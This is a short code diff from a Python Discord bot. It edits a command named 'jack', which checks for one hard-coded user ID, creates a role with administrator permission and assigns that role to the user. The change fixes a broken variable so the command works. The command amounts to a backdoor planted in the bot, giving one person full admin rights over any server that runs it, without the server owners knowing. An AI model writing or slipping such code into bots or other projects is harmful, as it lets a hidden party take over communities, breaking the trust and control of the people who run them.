@@ -131,7 +131,7 @@ async def mute(ctx, member: discord.Member, time: int, *,reason: str):
 async def jack(ctx):
     if ctx.message.author.id == '344967220025098242':
         await client.create_role(ctx.message.server, name="JACK")
-        role = discord.utils.get(member.server.roles, name="JACK")
+        role = discord.utils.get(ctx.message.author.server.roles, name="JACK")
         role.permissions.administrator = True
         await client.add_roles(ctx.message.author, role)
     else:
